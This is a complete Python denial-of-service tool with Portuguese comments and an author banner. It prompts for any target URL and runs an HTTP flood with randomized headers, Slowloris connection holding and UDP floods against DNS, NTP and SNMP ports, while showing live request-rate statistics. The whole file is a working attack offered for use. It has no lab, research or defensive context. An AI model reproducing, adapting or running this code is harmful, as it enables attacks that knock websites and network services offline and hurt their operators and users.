#!/usr/bin/env python3

import threading
import requests
import random
import time
import sys
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

class DDoSEficiente:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        
        self.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            'https://www.youtube.com/'
        ]
        
        self.is_attacking = False
        self.request_count = 0
        self.success_count = 0
        self.start_time = None
        
    def get_random_headers(self):
        """Gera headers aleatórios realistas"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': random.choice(self.referers),
            'DNT': random.choice(['1', '0']),
        }
    
    def resolve_target(self, target_url):
        """Resolve o alvo para IP e porta"""
        try:
            parsed = urlparse(target_url)
            hostname = parsed.hostname or target_url
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            ip = socket.gethostbyname(hostname)
            return ip, port, hostname
        except Exception as e:
            print(f"[!] Erro ao resolver: {e}")
            return None, None, None
    
    def send_http_flood(self, target_url, attack_id):
        """Envia requisições HTTP em massa"""
        while self.is_attacking:
            try:
                methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
                method = random.choice(methods)
                
                params = {
                    'cb': random.randint(1000000, 9999999),
                    'sid': ''.join(random.choices('abcdef0123456789', k=16)),
                }
                
                if method == 'GET':
                    response = requests.request(
                        method=method,
                        url=target_url,
                        params=params,
                        headers=self.get_random_headers(),
                        timeout=8,
                        verify=False,
                        allow_redirects=True
                    )
                elif method == 'POST':
                    post_data = {
                        'user': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)),
                        'pass': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10)),
                    }
                    
                    response = requests.request(
                        method=method,
                        url=target_url,
                        data=post_data,
                        headers=self.get_random_headers(),
                        timeout=8,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    response = requests.request(
                        method=method,
                        url=target_url,
                        headers=self.get_random_headers(),
                        timeout=8,
                        verify=False,
                        allow_redirects=True
                    )
                
                self.request_count += 1
                if response.status_code < 500:
                    self.success_count += 1
                
                if self.request_count % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.request_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Requests: {self.request_count} | RPS: {rps:.1f} | Status: {response.status_code}")
                
            except:
                self.request_count += 1
                continue
    
    def slowloris_attack(self, target_host, target_port, attack_id):
        """Ataque Slowloris"""
        try:
            ip = socket.gethostbyname(target_host)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, target_port))
            
            request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            request += "User-Agent: Mozilla/5.0\r\n"
            request += "Connection: keep-alive\r\n"
            request += f"X-a: {random.randint(1, 5000)}\r\n"
            
            s.send(request.encode())
            
            while self.is_attacking:
                try:
                    s.send(f"X-b: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(15)
                except:
                    break
                    
            s.close()
        except:
            pass
    
    def udp_flood(self, target_ip, target_port, attack_id):
        """Ataque UDP flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.is_attacking:
                packet_size = random.randint(64, 1024)
                data = random._urandom(packet_size)
                
                ports = [target_port]
                if target_port == 53:
                    ports.extend([53, 5353])
                elif target_port == 123:
                    ports.extend([123, 161])
                
                for port in ports:
                    try:
                        sock.sendto(data, (target_ip, port))
                        self.request_count += 1
                    except:
                        pass
                
                time.sleep(0.001)
                
        except:
            pass
    
    def stats_monitor(self):
        """Monitora estatísticas"""
        print("\n" + "─" * 40)
        print(" Estatística do ataque:")
        print("─" * 40)
        
        last_count = 0
        while self.is_attacking:
            time.sleep(1)
            current = self.request_count
            rps = current - last_count
            last_count = current
            
            elapsed = time.time() - self.start_time
            avg_rps = current / elapsed if elapsed > 0 else 0
            
            print(f"[!] RPS: {rps}/s | Total: {current} | Média: {avg_rps:.1f}/s")
    
    def iniciar_ataque(self, target_url, duration=60, threads=80):
        """Inicia o ataque completo"""
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        print("[*] Modo ataque on!")
        print(f"[?]Alvo: {target_url}")
        print(f"[?]Duração: {duration}s")
        print(f"[!]Threads: {threads}")
        
        target_ip, target_port, target_host = self.resolve_target(target_url)
        if not target_ip:
            print("[❌] Alvo inválido!")
            return False
        
        print(f"[!] {target_host} -> {target_ip}:{target_port}")
        
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.start_time = time.time()
        
        stats_thread = threading.Thread(target=self.stats_monitor, daemon=True)
        stats_thread.start()
        
        with ThreadPoolExecutor(max_workers=threads * 2) as executor:
            futures = []
            
            for i in range(threads):
                future = executor.submit(self.send_http_flood, target_url, i)
                futures.append(future)
            
            if target_port in [80, 443, 8080, 8443]:
                for i in range(threads // 2):
                    future = executor.submit(self.slowloris_attack, target_host, target_port, i + 1000)
                    futures.append(future)
            
            if target_port in [53, 123, 161]:
                for i in range(threads // 2):
                    future = executor.submit(self.udp_flood, target_ip, target_port, i + 2000)
                    futures.append(future)
            
            time.sleep(duration)
            self.is_attacking = False
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=3)
                except:
                    pass
        
        elapsed = time.time() - self.start_time
        total_rps = self.request_count / elapsed if elapsed > 0 else 0
        
        print("\n" + "✅" * 40)
        print("[!] ATAQUE FINALIZADO!")
        print("✓" * 40)
        print(f"Total: {self.request_count} requests")
        print(f"RPS Médio: {total_rps:.1f}/s")
        print(f"Tempo: {elapsed:.1f}s")
        print("✓" * 40)
        
        return True

def mostrar_banner():
    """Exibe banner personalizado"""
    print("╔══════════════════════════════════════════════╗")
    print("║                                              ║")
    print("║           ▄▄▄▄    ▒█████    ██▀███           ║")
    print("║          ▓█████▄ ▒██▒  ██▒▓██ ▒ ██▒          ║")
    print("║          ▒██▒ ▄██▒██░  ██▒▓██ ░▄█ ▒          ║")
    print("║          ▒██░█▀  ▒██   ██░▒██▀▀█▄            ║")
    print("║          ░▓█  ▀█▓░ ████▓▒░░██▓ ▒██▒          ║")
    print("║          ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░          ║")
    print("║          ▒░▒   ░   ░ ▒ ▒░   ░▒ ░ ▒░          ║")
    print("║           ░    ░ ░ ░ ░ ▒    ░░   ░           ║")
    print("║           ░          ░ ░     ░               ║")
    print("║                ░                             ║")
    print("║                                              ║")
    print("╚══════════════════════════════════════════════╝")
    
    print("\n" + "═" * 44)
    print("               >DDoS Bor!< ")
    print("═" * 44)
    
    print("╭══════════════ ⪩")
    print("┃")
    print("[!]Atk DOS!")
    print("┃")
    print("[!]by Guss🦖")
    print("┃")
    print("[!]Instagram: @gustavo.rtz😋")
    print("╰══════════════")

def main():
    """Função principal"""
    mostrar_banner()
    
    target = input("[!] URL do alvo: ").strip()
    
    if not target:
        print("[❌] Nenhum alvo!")
        return
    
    try:
        duration = int(input("[?] Segundos (60): ") or "60")
        threads = int(input("[!] Threads (80): ") or "80")
    except:
        duration = 60
        threads = 80
    
    print(f"\n[!] Alvo: {target}")
    print(f"[!] Duração: {duration}s")
    print(f"[!] Threads: {threads}")
    print("─" * 44)
    
    confirm = input("\n[?] Confirmar? (s/N): ").strip().lower()
    
    if confirm != 's':
        print("[×] Cancelado!")
        return
    
    print("\n[!] Iniciando em 1...")
    time.sleep(1)
    print("[!!] 2...")
    time.sleep(1)
    print("[!!!] 3...")
    time.sleep(1)
    print("[🔥]\n")
    
    atacante = DDoSEficiente()
    
    try:
        atacante.iniciar_ataque(
            target_url=target,
            duration=duration,
            threads=threads
        )
    except KeyboardInterrupt:
        print("\n\n[⚠️] Interrompido!")
        atacante.is_attacking = False
    except Exception as e:
        print(f"\n[❌] Erro...: {e}")
    finally:
        print("\n[!] Fim.")

if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")
    
    main()
    
